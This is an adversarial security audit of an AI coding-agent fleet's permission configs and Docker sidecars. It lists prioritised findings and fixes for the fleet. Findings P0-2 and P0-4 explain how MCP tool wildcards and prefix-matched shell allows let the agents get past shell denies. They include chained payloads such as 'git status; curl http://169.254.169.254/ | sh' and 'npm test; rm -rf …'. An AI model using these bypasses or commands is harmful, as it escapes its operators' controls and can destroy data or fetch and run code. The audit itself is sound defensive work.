# ADVERSARIAL FLEET AUDIT — CONSOLIDATED FINDINGS

**Target:** `/home/john/Projects/Heretek-Crew`
**Date:** 2026-10-17 | **Formation:** Alpha (Runtime) + Beta (Version/Arch) + Gamma (Security)
**Rule:** Tests were not trusted. Every P0/P1 below has live file evidence; spot re-verified by controller (`ls roles/` = 56, `plugins` bare-name confirmed, budget sum 1,270,000¢ confirmed, `external:true` at sidecars:720 confirmed).

---

## P0 / Critical

### P0-1. `plugins: ["opencode-harness"]` bare name does not resolve to scoped npm package
- **Files:** 50× `roles/*/opencode/opencode.json` (e.g. `roles/vector-rag-spec/opencode/opencode.json:48-51` → `['opencode-mem','opencode-harness']`); installer is scoped `docker/Dockerfile:58` (`@heretek-ai/opencode-harness@1.0.7`, verified on npm, latest=1.0.7, SLSA-signed).
- **Proof:** `cat roles/vector-rag-spec/opencode/opencode.json | python3 -c "import json,sys;print(json.load(sys.stdin)['plugins'])"` → bare name; upstream README registers as `[["@heretek-ai/opencode-harness",{...}]]`. Bare specifier never resolves to scoped package under Node resolution.
- **Fix:**
```diff
-    "plugins": ["opencode-mem", "opencode-harness"]
+    "plugins": ["opencode-mem", "@heretek-ai/opencode-harness"]
```
Apply to all 50 fleet roles, then `opencode plugin list` inside built image.

### P0-2. MCP-namespace escapes bypass every shell deny (fleet-wide, systematic)
- **Files:** `roles/k8s-orchestrator/opencode/opencode.json:44-69` (denies `kubectl apply*/delete*`, allows `kubernetes_*`+`docker_*`); `roles/dba-specialist/opencode/opencode.json:25-40` (denies `psql*`, allows `postgres_*`); `roles/cloud-platform-eng/opencode/opencode.json:34-47` (denies `tofu/terraform apply*`, allows `aws_*`); `roles/mlops-serving-eng/opencode/opencode.json:34-44` (`docker_*` allow, zero docker denies); `git_*` wildcard in ~20 roles; `filesystem_*` with root `/paperclip/workspaces` in `binary-reverse-eng:76`, `firmware-sec-analyst`, `brand-copy-spec`.
- **PoC:** `kubernetes_create_pod(image="alpine")` via MCP achieves what shell deny forbids. `AGENTS.md §4` admits prefix/MCP limits but ships bypass open — mitigations cited (`POSTGRES_READONLY_URL`, read-only kubeconfig) do not exist in tree (`grep -rn POSTGRES_READONLY_URL` outside `roles/` = zero hits; `KUBECONFIG: /paperclip/secrets/kubeconfig-readonly` has no volume).
- **Fix:** per-role same-namespace deny tails + least-privilege MCP verbs:
```diff
-    {"action": "kubernetes_*", "resource": "*", "effect": "allow"},
+    {"action": "kubernetes_list*", "resource": "*", "effect": "allow"},
+    {"action": "kubernetes_read*", "resource": "*", "effect": "allow"},
+    {"action": "kubernetes_*", "resource": "*", "effect": "deny"},
+    {"action": "docker_*", "resource": "*", "effect": "deny"},
```
Provision read-only Postgres role + `POSTGRES_READONLY_URL` (fail-closed, no default), scope `GITHUB_TOKEN`, provision `/paperclip/secrets/kubeconfig-readonly` or fail seed if absent.

### P0-3. `harness_*` wildcard in 51/51 new-dialect roles — unaudited universal capability
- **Evidence:** `grep -c harness_ roles/*/opencode/opencode.json | grep -v ':0' | wc -l` = 51. `scripts/smoke-test.sh:55-58` admits harness tool registration "cannot be verified statically… asserted only by a live agent run (tracked)". Even read-only roles (e.g. `threat-modeler`, zero shell allows) get full `harness_*`.
- **Fix:** enumerate (`npm explore @heretek-ai/opencode-harness -- cat manifest`), replace with per-tool allows, add manifest assertion to `smoke-test.sh §3b` + live deny-tail probe.

### P0-4. Prefix-match shell allows are chain-bypassable; no negative probe exists
- **Files:** all 243 shell allows, e.g. `programmer:28` (`git status*`), `mlops-serving-eng:34` (`curl -s http://*`). `smoke-test.sh §3b:342-415` asserts deny-tail presence only, never executes `;<payload>`.
- **PoC (prefix enforcer):** `git status; curl http://169.254.169.254/ | sh` matches `git status*`; `npm test; rm -rf …` matches `npm test*`; `curl -s http://evil;x` matches `curl -s http://*`.
- **Fix:** document allows as advisory-only; enforce at mounts/GRANTs/RBAC/MCP denies; add negative-probe test feeding `git status; id`, `npm test && id` and requiring denial; prefer exact-argv matching.

### P0-5. `git-drift-coord` holds full history-rewrite primitive
- **File:** `roles/git-drift-coord/opencode/opencode.json:31-53` — allows `git worktree*`, `git rebase*`, `git push --force-with-lease*` + `git_*` MCP. `--force-with-lease` allow + unqualified MCP defeat the `git push --force *` deny on line 51.
- **Fix:** remove `rebase`/`force-with-lease`/`worktree` allows; scope `git_*` MCP to read verbs; gate pushes behind `PAPERCLIP_TOOL_ACTION_SIGNING_SECRET` human approval.

### P0-6. `gotenberg:8.15.0` — 3× 2026 CVEs incl. CVSS 9.4 SSRF
- **File:** `docker-compose.sidecars.yml:208`. Upstream at 8.37.x. 8.15 predates CVE-2026-42596 (SSRF 9.4, fixed 8.32.0), CVE-2026-44829 (traversal, fixed 8.33.0), CVE-2026-42592 (SSRF ≤8.31.0). PDF service reachable from agent workloads.
- **Fix:** `gotenberg/gotenberg:8.33.0` minimum (prefer latest 8.3x); re-run smoke.

### P0-7. `rabbitmq:3.13.7` — community EOL 2024-09-30, 2yr unpatched
- **File:** `docker-compose.sidecars.yml:76`. Current 4.3.6. File's own VERSION PLAN admits it.
- **Fix:** `rabbitmq:4.3.6-management-alpine` + Firecrawl crawl-queue smoke test (quorum-queue defaults changed).

---

## P1 / High

### P1-1. Budget prose-vs-code $90 contradiction (fail-closed warning fires every run)
- **Files:** `roles-catalog/ROLE_CATALOG_50.md:119` claims $12,790.00; `scripts/seed-50-fleet.sh:95` `FLEET_BUDGET_CAP_CENTS=1270000` ($12,700) + `:268-322` per-role table.
- **Proof:** `python3` sum of 50 `printf` values in `role_budget_cents()` = **1,270,000¢ ($12,700.00), n=50**. Seed `:447-448` drift warning fires until reconciled. Controller re-verified.
- **Fix:** re-sum catalog table; fix `ROLE_CATALOG_50.md:119` ($12,790→$12,700) or the one wrong row + seed entry.

### P1-2. Sidecar network merge break — `heretek: external:true` vs created network
- **Files:** `docker-compose.sidecars.yml:719-720` (`external:true`) vs `docker-compose.yml:235-237` (creates it).
- **Proof (Alpha):** merged `config` yields `external:true` but `docker network inspect heretek` → not found; any `compose -f both --profile <x> up` fails unless pre-created. Undocumented in Makefile/README/`.env.example`.
- **Fix:** drop `external:true` (keep `name: heretek`) OR add `docker network create heretek || true` to Makefile sidecar targets + README.

### P1-3. `local-ci-runner` + socket-proxy cannot run CI as defined (two breaks)
- **File:** `docker-compose.sidecars.yml:388-695`. (1) Runner `command: ["sleep","infinity"]` — nothing invokes `act`. (2) Proxy `POST/BUILD/EXEC: "0"` — `act` requires create/build/exec. File's own comment concedes "Verify CI still functions with GET-only access" — it cannot.
- **Fix:** (a) document runner as quarantined read-only observer (CI via host `act` v0.2.89), or (b) dedicated `ci` network + full socket mount, remove proxy from its path.

### P1-4. `redis:7.4.1-alpine` — CVE-2025-49844 (CVSS 9.9 RCE, affects <7.4.6), ×2 services
- **Files:** `docker-compose.sidecars.yml:10,57`. Current 7.4.11 / 8.10. Unauthenticated on shared net (self-noted `:13-16`).
- **Fix:** `redis:7.4.11-alpine` minimum ×2; add `requirepass`; schedule 8.x.

### P1-5. Write+exec synergy = in-container RCE (`node` UID 1000 + full env)
- `data-pipeline-eng`: writes `pipelines/**` + `python3 pipelines/*`; `mlops-serving-eng`: `tools/mlops/**` + `python3 tools/mlops/*`; `tech-artist-pipeline`: `tools/asset-pipeline/**` + `node …/*`; `dependency-patcher`: `npm install*/go get*/cargo update*` (lifecycle-script RCE) + `git commit*`; `android/java`: `./gradlew*/./mvnw*` (Turing-complete builds) + `adb connect*` (arbitrary host).
- **Fix:** split author vs executor roles; pin exact executable paths; run builds in `piston`/`local-ci-runner`, not paperclip container.

### P1-6. SSRF via open `curl` allows to unauthenticated bridge services
- `mlops-serving-eng:34` (`curl -s http://*`), `sre-incident-eng` (`curl -sI*`) reach `qdrant:6333`, `gotenberg:3000`, `searxng:8080`, `litellm:4000`, `neo4j:7474`, `piston:2000`, `radare2:9090` (unauth `0.0.0.0:9090`), socket-proxy `:2375` GET enumeration. Browser MCP roles add same surface.
- **Fix:** remove open curl; replace with named-URL checks or egress-allowlisted fetch MCP; segment sidecar networks.

### P1-7. Overbroad `fs:write` globs
- `dependency-patcher` `*lock*`, `fe-perf-eng:17-19` `*config*`, `static-analysis-lead` `*lint*`, `go-backend-eng` `go.*`, `tech-docs-lead` `*.md` (all markdown repo-wide), `cpp-lowlevel-eng` `src/**`, `programmer:12-19` `workspaces/**` (entire shared volume).
- **Fix:** anchor to dir+filename (`**/package-lock.json`, `docs/**/*.md`); reject `*substring*` in lint.

### P1-8. Secret overexposure + dangling references
- `DATABASE_URL` with embedded password (`docker-compose.yml:77`, `sidecars:524`) granted wholesale to litellm (`STORE_MODEL_IN_DB=True`); all provider keys fanned into paperclip env (`:94-104`) → every agent child. `GITHUB_TOKEN` (6 roles) and `POSTGRES_READONLY_URL` (dba) set nowhere → empty fallback. `KUBECONFIG` path has no volume. Good: `CHANGE_ME__` placeholders, `:?` guards, no hardcoded keys, tokens never echoed.
- **Fix:**
```diff
+POSTGRES_READONLY_URL=CHANGE_ME__postgres_readonly_url
+GITHUB_TOKEN=CHANGE_ME__github_token_pat
-      DATABASE_URL: postgres://${POSTGRES_USER...}:${POSTGRES_PASSWORD...}@...
+      # litellm: dedicated least-privilege credential, not superuser URL
```

### P1-9. Prebuilt `ghcr.io/heretek-ai/heretek-crew:v1.0.0` unpublished (401)
- **File:** `docker-compose.prebuilt.yml:29` (self-admits `:14-19`); `git tag` empty; workflow only mints tags from `refs/tags/v*`.
- **Fix:** `git tag v1.0.0 && git push origin v1.0.0`, or retarget to published `sha-<sha>` digest + quickstart update.

### P1-10. Version lag with security/detection impact
- `semgrep:1.97.0` (`sidecars:370`) vs current 1.181.0 (~84 releases, rule drift); `qdrant:v1.12.5` (`:452`) vs v1.19.2 (7 minors, unauth); `neo4j:5.26.0-community-bullseye` (`:481`) vs 5.26.30+ on trixie (bullseye oldstable EOL ~2026, misses Bouncy Castle/log4j fixes); `minio:RELEASE.2024-11-07` (`:570`) ~1yr stale (misses Oct-2025 session-policy priv-esc) + no digest (quay.io auth-gated) + Docker Hub `minio/minio` archived, AGPLv3 source-only implication; `jaeger:1.63.0` (`:614`) v1 EOL 2025-12-31 → migrate `jaegertracing/jaeger:2.22`; `piston` digest (`:431`) tracks floating `latest` — vendor to `ghcr.io/heretek-ai/piston:<semver>`.
- **Fix:** bump per table; `skopeo inspect --raw` minio from authed host and digest-pin; verify `mcp-server-qdrant==0.8.1` against qdrant v1.19.

### P1-11. 6 legacy roles lack harness + wrong permission dialect
- **Files:** `roles/{designer,director,pm,programmer,qa,tester}/opencode/opencode.json` — no `plugins` key (controller `grep -L plugins` confirms exactly these 6); legacy `read/glob/grep/list/edit/write/bash` dialect vs `smoke-test.sh §3/§3b` `fs:*/shell` enforcement.
- **Fix:** delete if superseded by 50-fleet, or migrate to fleet dialect + harness plugin. Do not carry two dialects.

### P1-12. Privileged/high-capability sidecars co-schedulable; soft in-network auth
- `docker-android:642-650` `privileged:true` + `/dev/kvm`; `mitmproxy:259-283` TLS-intercept CA persisted; `ghidra:291-316` server on :1337 (ro mount good); `semgrep` sleep-infinity + ro mount (good); `local-ci-runner:676-695` writable shared `./workspaces`. Host binds clean (all `127.0.0.1` except intentional Caddy 80/443 `:160-162`); but `0.0.0.0` in-container binds + unauthenticated redis/rabbitmq/qdrant/minio/mailpit/neo4j/jaeger-OTLP/piston/gotenberg/hound reachable from every bridge member.
- **Fix:** Makefile guard refusing `--profile mobile` + `devsec`/`web-research` co-scheduling; per-category networks; Redis/Qdrant auth; runner workspaces ro except scratch.

---

## P2 / Medium

- **P2-1. 56-vs-50 role drift.** `ls roles/ | wc -l` = 56 = 50 fleet + 6 legacy. Catalog (`roles-catalog/01…09` + `ROLE_CATALOG_50.md`) consistent at 50. Same fix as P1-11.
- **P2-2. `dispatch-pipeline.sh` automates 1/6 advertised phases, always exits 1.** `:90-168`: execute mode runs only phase 3 (worktree + `task_plan.md`); phases 1/2/4/5 log-only, no Paperclip/harness calls; phase 6 unconditional `exit 1`. Header claims "end-to-end autonomous factory relay". Fail-closed-merge stance sound; claim broken. Fix: rename to provisioner + explicit `SKIPPED (manual)` or implement dispatch; drop redundant `mkdir -p` after `worktree create` (`:118`).
- **P2-3. `dispatch`/`worktree-manager` cwd-dependent.** `backup/restore/smoke` anchor `REPO_ROOT`+`cd`; these two use relative `scripts/worktree-manager.sh` (`dispatch:117`) + `workspaces/tickets/…`. Live: run from `/tmp/fakeexe` → `No such file…`, exit 127; hostile same-named script would execute. Fix: insert `REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"; cd "${REPO_ROOT}"` after `set -euo pipefail`.
- **P2-4. `--session` passthrough byte-correct, resume unvalidated.** Shim passes through (test 12); live binary requires `ses`-prefixed IDs (`Expected a string starting with "ses"`). `NOTES.md:40` "Verified working" lacks proof Paperclip mints `ses`-IDs. Needs one live stack run.
- **P2-5. `ghidra:11.2` → 12.1.4** (`sidecars:292`); heap 3G/4g math sound. Fix: `blacktop/ghidra:12.1` + entrypoint healthcheck re-test; keep MAXMEM ≤75%.
- **P2-6. `docker-android` aging** (`:642` Android 14 2024 build; upstream has 15/16). Fix at next mobile cycle; keep profile gating + privileged warning.
- **P2-7. MCP pins:** `@modelcontextprotocol/server-github@2025.4.8` (7 roles, Apr-2025 date-version), `@playwright/mcp@0.0.83` (2 legacy), `mcp-server-qdrant==0.8.1` re-check vs server v1.19. `codebase-memory-mcp@0.12.1` pattern sane (exact + `npx -y`); `server-filesystem/memory@1.0.0`, `server-postgres@0.6.2` acceptable.
- **P2-8. Goal-plugin scope ambiguity.** `@prevalentware/opencode-goal-plugin` only on `exec-director`. Confirm fleet-wide vs director-only intent.
- **P2-9. No per-profile resource table.** All-profiles sum ~30.6 CPU/~46.6 GB (paper number — nobody runs all profiles); but heaviest single profile (`web-research` ≈ 8 CPU/12 GB) OOMs 16 GB laptops. Add per-profile footprint + minimum-host guidance to `SUPPORTING_SERVICES.md`; consider `mem_reservation` for JVM/browser services. Default profile (3 CPU/5 GB) sane.
- **P2-10. Smoke-test sandbox gap.** `§3:181-233` + `§3b:342-415` check shape/deny-tails only; unchecked: MCP wildcards, `fs:write` globs, `filesystem_*` roots, prefix-bypass execution, runtime `dangerouslySkipPermissions`. Add MCP↔shell overlap fail + glob-specificity lint + negative probes.
- **P2-11. `sabotage-qa-tester`** (`cargo mutants*`, `stryker`) writes `tests/chaos/**` but mutation runners rewrite via toolchain temp dirs — pin execution to `piston`/CI, not paperclip container.
- **P2-12. Backup/restore unencrypted.** `backup-db.sh`/`restore-db.sh` genuinely fail-closed (health gates, typed confirm, `ON_ERROR_STOP=1`, no-overwrite, pruning, no secret echo) but dumps land plaintext in `backups/`. Add `age`/`gpg` at rest.

## P3 / Low / Cleanups

- **P3-1.** Empty-string `--variant ""` passthrough inconsistency (`shim:123-126`); normalize like `--variant=`. Harmless.
- **P3-2.** `dispatch-pipeline.sh` interpolates `WORKTREE_DIR` pre-validation (downstream allowlist adequate; harmless).
- **P3-3.** `minio` tag-without-digest self-documented (`sidecars:570` quay.io 401 reason) — tracked as P1-10, not fresh.
- **P3-4.** Unverified-without-pull (require live boot; not asserted broken): `radare2 r2 -qc=H 0.0.0.0:9090` syntax, `hound` missing `config.json` (crash-loop vector), `firecrawl harness.js --start-docker`, `gotenberg/qdrant/jaeger/playwright` wget healthchecks, Caddy localhost-default TLS. Single closing test: `--profile`-matrix `up` + `docker ps --format health` sweep.
- **P3-5.** `Dockerfile:62-65 readlink` assertion only exercisable at build (needs `/tmp/paperclip` context) — close via `make build` on connected host.
- **P3-6.** Re-verify `codebase-memory-mcp@0.12.1`, tailscale/mailpit/firecrawl tags at next bump cycle; annotate digest-only pins (`nuq-postgres`, `playwright-service`) with `# tag=X.Y.Z @ date`.

---

## Verified-solid (do not regress)

- **Shim (Alpha live vs `opencode` 2.0.30 binary):** `--dir`/`--variant` rejections confirmed, translation byte-identical (`Model unavailable` shape), `--auto`/`--session`/`--`/`OPENCODE_GO_API_KEY` correct; `test-shim.sh` 39/39 + 9 edge probes pass; `shellcheck -S warning` zero on all 5 scripts.
- **Fail-closed scripting:** worktree traversal/unknown-subcommand/missing-file gates exit 2/1 correctly; restore typed-confirm + `RESTORE_YES=1` gate; seed `dangerouslySkipPermissions:False` + `XDG_CONFIG_HOME` + `OPENCODE_DISABLE_PROJECT_CONFIG` in compose + seeds; token never logged.
- **Supply-chain hygiene:** zero `:latest` across 24 images; digest-pins with provenance comments on 5 tricky images; npm exact pins; GHCR workflow well-constructed (QEMU/Buildx, `latest` gated on `v*` tags, minimal perms, SHA-pinned base).
- **Core versions current:** `postgres:17-alpine`, `caddy:2.11.7` (latest 2026-10-03), `node:24-trixie-slim`, `@opencode/cli+client@2.0.32` (npm latest 2026-10-17), `browserless v2.24.2`, `mitmproxy 11.0.2`, `wiremock 3.10.0`, `catthehacker/ubuntu:act-22.04` (22.04→2027), heartbeat policy (1800/3600/rest-0), socket-proxy `POST/BUILD/EXEC=0`.
- **In-file honesty:** RabbitMQ/Semgrep/Jaeger/Piston/MinIO risks already self-documented with VERSION PLANs — execute them starting with P0s.

## Remediation order

1. P0-1 harness plugin name → P0-6 gotenberg → P0-7 rabbitmq (live CVEs + broken registration).
2. P0-2/P0-3 MCP + harness wildcards; provision read-only PG role, `GITHUB_TOKEN`, kubeconfig (P1-8).
3. P0-5 git-drift force-push removal; P0-4 negative probes; P1-5 write+exec split.
4. P1-1 budget ($90), P1-2 network, P1-3 CI-runner, P1-9 prebuilt tag, P1-11 legacy roles.
5. P1-4/P1-10 version bumps; P1-12 segmentation; P2 table + cwd + pipeline-claim fixes.
